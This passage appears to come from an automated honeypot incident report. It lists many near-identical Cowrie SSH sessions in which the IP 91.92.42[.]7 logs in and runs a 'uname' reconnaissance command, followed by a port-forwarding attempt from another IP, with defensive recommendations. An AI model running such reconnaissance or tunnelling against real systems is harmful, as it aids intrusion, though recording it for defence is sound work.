| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:05` | `cowrie.session.connect` |
| `2026-08-15 07:08:06` | `cowrie.client.version` |
| `2026-08-15 07:08:06` | `cowrie.client.kex` |
| `2026-08-15 07:08:08` | `cowrie.login.success` |
| `2026-08-15 07:08:10` | `cowrie.session.params` |
| `2026-08-15 07:08:10` | `cowrie.command.input` |
| `2026-08-15 07:08:10` | `cowrie.log.closed` |
| `2026-08-15 07:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d67a65485064

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:11` | `cowrie.session.connect` |
| `2026-08-15 07:08:11` | `cowrie.client.version` |
| `2026-08-15 07:08:11` | `cowrie.client.kex` |
| `2026-08-15 07:08:13` | `cowrie.login.success` |
| `2026-08-15 07:08:15` | `cowrie.session.params` |
| `2026-08-15 07:08:15` | `cowrie.command.input` |
| `2026-08-15 07:08:16` | `cowrie.log.closed` |
| `2026-08-15 07:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b44c40b8d9f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:17` | `cowrie.session.connect` |
| `2026-08-15 07:08:18` | `cowrie.client.version` |
| `2026-08-15 07:08:18` | `cowrie.client.kex` |
| `2026-08-15 07:08:19` | `cowrie.login.success` |
| `2026-08-15 07:08:20` | `cowrie.session.params` |
| `2026-08-15 07:08:20` | `cowrie.command.input` |
| `2026-08-15 07:08:20` | `cowrie.log.closed` |
| `2026-08-15 07:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12221a29b655

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:24` | `cowrie.session.connect` |
| `2026-08-15 07:08:24` | `cowrie.client.version` |
| `2026-08-15 07:08:24` | `cowrie.client.kex` |
| `2026-08-15 07:08:25` | `cowrie.login.success` |
| `2026-08-15 07:08:26` | `cowrie.session.params` |
| `2026-08-15 07:08:26` | `cowrie.command.input` |
| `2026-08-15 07:08:26` | `cowrie.log.closed` |
| `2026-08-15 07:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a037c09577f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:29` | `cowrie.session.connect` |
| `2026-08-15 07:08:29` | `cowrie.client.version` |
| `2026-08-15 07:08:29` | `cowrie.client.kex` |
| `2026-08-15 07:08:31` | `cowrie.login.success` |
| `2026-08-15 07:08:32` | `cowrie.session.params` |
| `2026-08-15 07:08:32` | `cowrie.command.input` |
| `2026-08-15 07:08:32` | `cowrie.log.closed` |
| `2026-08-15 07:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc9096432050

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:34` | `cowrie.session.connect` |
| `2026-08-15 07:08:35` | `cowrie.client.version` |
| `2026-08-15 07:08:35` | `cowrie.client.kex` |
| `2026-08-15 07:08:36` | `cowrie.login.success` |
| `2026-08-15 07:08:38` | `cowrie.session.params` |
| `2026-08-15 07:08:38` | `cowrie.command.input` |
| `2026-08-15 07:08:38` | `cowrie.log.closed` |
| `2026-08-15 07:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2a47bc61f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:40` | `cowrie.session.connect` |
| `2026-08-15 07:08:40` | `cowrie.client.version` |
| `2026-08-15 07:08:40` | `cowrie.client.kex` |
| `2026-08-15 07:08:42` | `cowrie.login.success` |
| `2026-08-15 07:08:43` | `cowrie.session.params` |
| `2026-08-15 07:08:43` | `cowrie.command.input` |
| `2026-08-15 07:08:43` | `cowrie.log.closed` |
| `2026-08-15 07:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e887105ed66

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:45` | `cowrie.session.connect` |
| `2026-08-15 07:08:46` | `cowrie.client.version` |
| `2026-08-15 07:08:46` | `cowrie.client.kex` |
| `2026-08-15 07:08:47` | `cowrie.login.success` |
| `2026-08-15 07:08:48` | `cowrie.session.params` |
| `2026-08-15 07:08:48` | `cowrie.command.input` |
| `2026-08-15 07:08:48` | `cowrie.log.closed` |
| `2026-08-15 07:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76e1ac2ac57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:51` | `cowrie.session.connect` |
| `2026-08-15 07:08:51` | `cowrie.client.version` |
| `2026-08-15 07:08:51` | `cowrie.client.kex` |
| `2026-08-15 07:08:52` | `cowrie.login.success` |
| `2026-08-15 07:08:53` | `cowrie.session.params` |
| `2026-08-15 07:08:53` | `cowrie.command.input` |
| `2026-08-15 07:08:54` | `cowrie.log.closed` |
| `2026-08-15 07:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-131ed8268800

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:08 |
| **Last Seen** | 2026-08-15 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:08:57` | `cowrie.session.connect` |
| `2026-08-15 07:08:57` | `cowrie.client.version` |
| `2026-08-15 07:08:57` | `cowrie.client.kex` |
| `2026-08-15 07:08:58` | `cowrie.login.success` |
| `2026-08-15 07:08:59` | `cowrie.session.params` |
| `2026-08-15 07:08:59` | `cowrie.command.input` |
| `2026-08-15 07:08:59` | `cowrie.log.closed` |
| `2026-08-15 07:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ebeda5106a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:03` | `cowrie.session.connect` |
| `2026-08-15 07:09:03` | `cowrie.client.version` |
| `2026-08-15 07:09:03` | `cowrie.client.kex` |
| `2026-08-15 07:09:04` | `cowrie.login.success` |
| `2026-08-15 07:09:05` | `cowrie.session.params` |
| `2026-08-15 07:09:05` | `cowrie.command.input` |
| `2026-08-15 07:09:05` | `cowrie.log.closed` |
| `2026-08-15 07:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d53409a4d74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:08` | `cowrie.session.connect` |
| `2026-08-15 07:09:08` | `cowrie.client.version` |
| `2026-08-15 07:09:08` | `cowrie.client.kex` |
| `2026-08-15 07:09:09` | `cowrie.login.success` |
| `2026-08-15 07:09:10` | `cowrie.session.params` |
| `2026-08-15 07:09:10` | `cowrie.command.input` |
| `2026-08-15 07:09:11` | `cowrie.log.closed` |
| `2026-08-15 07:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf58e668bf4d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:14` | `cowrie.session.connect` |
| `2026-08-15 07:09:14` | `cowrie.client.version` |
| `2026-08-15 07:09:14` | `cowrie.client.kex` |
| `2026-08-15 07:09:14` | `cowrie.login.success` |
| `2026-08-15 07:09:15` | `cowrie.session.params` |
| `2026-08-15 07:09:15` | `cowrie.command.input` |
| `2026-08-15 07:09:16` | `cowrie.log.closed` |
| `2026-08-15 07:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60488a22eaf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:19` | `cowrie.session.connect` |
| `2026-08-15 07:09:20` | `cowrie.client.version` |
| `2026-08-15 07:09:20` | `cowrie.client.kex` |
| `2026-08-15 07:09:20` | `cowrie.login.success` |
| `2026-08-15 07:09:21` | `cowrie.session.params` |
| `2026-08-15 07:09:21` | `cowrie.command.input` |
| `2026-08-15 07:09:21` | `cowrie.log.closed` |
| `2026-08-15 07:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5892a64493c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:25` | `cowrie.session.connect` |
| `2026-08-15 07:09:25` | `cowrie.client.version` |
| `2026-08-15 07:09:25` | `cowrie.client.kex` |
| `2026-08-15 07:09:26` | `cowrie.login.success` |
| `2026-08-15 07:09:27` | `cowrie.session.params` |
| `2026-08-15 07:09:27` | `cowrie.command.input` |
| `2026-08-15 07:09:27` | `cowrie.log.closed` |
| `2026-08-15 07:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d9133dce9be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:31` | `cowrie.session.connect` |
| `2026-08-15 07:09:31` | `cowrie.client.version` |
| `2026-08-15 07:09:31` | `cowrie.client.kex` |
| `2026-08-15 07:09:32` | `cowrie.login.success` |
| `2026-08-15 07:09:32` | `cowrie.session.params` |
| `2026-08-15 07:09:32` | `cowrie.command.input` |
| `2026-08-15 07:09:33` | `cowrie.log.closed` |
| `2026-08-15 07:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463eec44739d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:36` | `cowrie.session.connect` |
| `2026-08-15 07:09:37` | `cowrie.client.version` |
| `2026-08-15 07:09:37` | `cowrie.client.kex` |
| `2026-08-15 07:09:37` | `cowrie.login.success` |
| `2026-08-15 07:09:38` | `cowrie.session.params` |
| `2026-08-15 07:09:38` | `cowrie.command.input` |
| `2026-08-15 07:09:38` | `cowrie.log.closed` |
| `2026-08-15 07:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101c37bee4b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:42` | `cowrie.session.connect` |
| `2026-08-15 07:09:42` | `cowrie.client.version` |
| `2026-08-15 07:09:42` | `cowrie.client.kex` |
| `2026-08-15 07:09:43` | `cowrie.login.success` |
| `2026-08-15 07:09:44` | `cowrie.session.params` |
| `2026-08-15 07:09:44` | `cowrie.command.input` |
| `2026-08-15 07:09:44` | `cowrie.log.closed` |
| `2026-08-15 07:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eecab2fa0671

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:48` | `cowrie.session.connect` |
| `2026-08-15 07:09:48` | `cowrie.client.version` |
| `2026-08-15 07:09:48` | `cowrie.client.kex` |
| `2026-08-15 07:09:49` | `cowrie.login.success` |
| `2026-08-15 07:09:50` | `cowrie.session.params` |
| `2026-08-15 07:09:50` | `cowrie.command.input` |
| `2026-08-15 07:09:50` | `cowrie.log.closed` |
| `2026-08-15 07:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c3c3665386

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:54` | `cowrie.session.connect` |
| `2026-08-15 07:09:54` | `cowrie.client.version` |
| `2026-08-15 07:09:54` | `cowrie.client.kex` |
| `2026-08-15 07:09:55` | `cowrie.login.success` |
| `2026-08-15 07:09:56` | `cowrie.session.params` |
| `2026-08-15 07:09:56` | `cowrie.command.input` |
| `2026-08-15 07:09:56` | `cowrie.log.closed` |
| `2026-08-15 07:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b5eb0cdb14d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:09 |
| **Last Seen** | 2026-08-15 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:09:59` | `cowrie.session.connect` |
| `2026-08-15 07:09:59` | `cowrie.client.version` |
| `2026-08-15 07:09:59` | `cowrie.client.kex` |
| `2026-08-15 07:10:01` | `cowrie.login.success` |
| `2026-08-15 07:10:02` | `cowrie.session.params` |
| `2026-08-15 07:10:02` | `cowrie.command.input` |
| `2026-08-15 07:10:02` | `cowrie.log.closed` |
| `2026-08-15 07:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1317a24b411

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:10 |
| **Last Seen** | 2026-08-15 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:10:05` | `cowrie.session.connect` |
| `2026-08-15 07:10:05` | `cowrie.client.version` |
| `2026-08-15 07:10:05` | `cowrie.client.kex` |
| `2026-08-15 07:10:05` | `cowrie.login.success` |
| `2026-08-15 07:10:07` | `cowrie.session.params` |
| `2026-08-15 07:10:07` | `cowrie.command.input` |
| `2026-08-15 07:10:07` | `cowrie.log.closed` |
| `2026-08-15 07:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eeb567d2092

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:10 |
| **Last Seen** | 2026-08-15 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:10:11` | `cowrie.session.connect` |
| `2026-08-15 07:10:11` | `cowrie.client.version` |
| `2026-08-15 07:10:11` | `cowrie.client.kex` |
| `2026-08-15 07:10:12` | `cowrie.login.success` |
| `2026-08-15 07:10:13` | `cowrie.session.params` |
| `2026-08-15 07:10:13` | `cowrie.command.input` |
| `2026-08-15 07:10:13` | `cowrie.log.closed` |
| `2026-08-15 07:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da81d2eef976

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:10 |
| **Last Seen** | 2026-08-15 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:10:17` | `cowrie.session.connect` |
| `2026-08-15 07:10:17` | `cowrie.client.version` |
| `2026-08-15 07:10:17` | `cowrie.client.kex` |
| `2026-08-15 07:10:17` | `cowrie.login.success` |
| `2026-08-15 07:10:18` | `cowrie.session.params` |
| `2026-08-15 07:10:18` | `cowrie.command.input` |
| `2026-08-15 07:10:19` | `cowrie.log.closed` |
| `2026-08-15 07:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-613809efd972

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:10 |
| **Last Seen** | 2026-08-15 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:10:22` | `cowrie.session.connect` |
| `2026-08-15 07:10:23` | `cowrie.client.version` |
| `2026-08-15 07:10:23` | `cowrie.client.kex` |
| `2026-08-15 07:10:23` | `cowrie.login.success` |
| `2026-08-15 07:10:24` | `cowrie.session.params` |
| `2026-08-15 07:10:24` | `cowrie.command.input` |
| `2026-08-15 07:10:25` | `cowrie.log.closed` |
| `2026-08-15 07:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac3ed2017ae8

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-08-15 07:12 |
| **Last Seen** | 2026-08-15 07:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:12:03` | `cowrie.session.connect` |
| `2026-08-15 07:12:05` | `cowrie.client.version` |
| `2026-08-15 07:12:05` | `cowrie.client.kex` |
| `2026-08-15 07:12:09` | `cowrie.login.success` |
| `2026-08-15 07:12:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 07:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
